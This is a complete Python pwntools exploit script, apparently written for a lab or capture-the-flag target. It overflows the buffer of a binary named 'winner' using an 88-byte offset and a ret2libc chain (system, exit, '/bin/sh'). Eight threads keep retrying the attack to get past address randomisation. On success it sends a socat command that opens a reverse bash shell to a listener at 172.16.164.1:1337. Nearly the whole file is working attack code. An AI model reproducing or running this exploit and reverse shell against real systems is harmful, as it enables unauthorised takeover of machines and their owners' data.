from pwn import *
import threading


def thread(id):
    global pwnd
    tries = 0
    
    while not pwnd:
        # ssh -L 6969:localhost:1234 bob@172.16.164.140
        process = remote("localhost", 6969)
        process.sendline(exploit)

        recv = process.recvrepeat(timeout=1)

        info("Thread " + str(id) + ", Attempt no. " + str(tries))
        tries += 1

        if recv[-1:] == b' ' and not pwnd:
            pwnd = True
            success("Got "+ str(recv[-1:]) +" Pwnd! Hack away.")
            reverse = listen(1337)
            sleep(3)
            process.sendline(b"socat TCP:172.16.164.1:1337 EXEC:/bin/bash")
            reverse.interactive()
            break

        process.close()


if __name__ == "__main__":
    elf = ELF("./winner", checksec=False)
    libc = ELF("libc_target", checksec=False)
    context.binary = elf

    offset = 88

    pwnd = False

    sh_offset = next(libc.search(b"/bin/sh"))
    system_offset = libc.symbols["system"]
    exit_offset = libc.symbols["exit"]
    libc_base = 0xF7DAB000

    payload = b""
    payload += p32(libc_base + system_offset)
    payload += p32(libc_base + exit_offset)
    payload += p32(libc_base + sh_offset)

    exploit = b"A" * offset + payload

    threadnum = 8
    threads = []
    for i in range(0, threadnum):
        threads.append(threading.Thread(target = thread, args = (i,)))
        threads[i].start()

    for i in range(0, threadnum):
        threads[i].join()

